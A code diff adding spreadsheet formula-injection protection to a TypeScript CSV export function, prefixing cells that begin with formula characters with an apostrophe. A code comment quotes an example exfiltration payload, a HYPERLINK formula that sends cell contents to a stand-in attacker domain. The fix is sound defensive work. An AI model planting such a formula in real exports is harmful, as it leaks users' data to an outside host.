@@ -203,10 +203,17 @@ export async function buildAccountExport(
 // household inventory is most people.
 // ---------------------------------------------------------------------------
 
+// Quoting alone makes a cell parse correctly; it does not stop Excel and
+// Sheets treating a leading =, +, -, @, tab or CR as a formula. A repair note
+// or property nickname is attacker-supplied text (a co-owner, a guest, or CPSC
+// recall copy), so a cell like =HYPERLINK("https://evil.tld/?d="&A1,"Click")
+// would execute in the exporter's spreadsheet. Prefixing with an apostrophe is
+// the standard neutralisation: spreadsheets treat the rest as literal text.
 function csvEscape(value: unknown): string {
   if (value === null || value === undefined) return '';
   const text = typeof value === 'object' ? JSON.stringify(value) : String(value);
-  return /[",\n\r]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
+  const neutralized = /^[=+\-@\t\r]/.test(text) ? `'${text}` : text;
+  return /[",\n\r]/.test(neutralized) ? `"${neutralized.replace(/"/g, '""')}"` : neutralized;
 }
 
 /** Rows -> CSV using the given column order, so exports stay stable over time. */
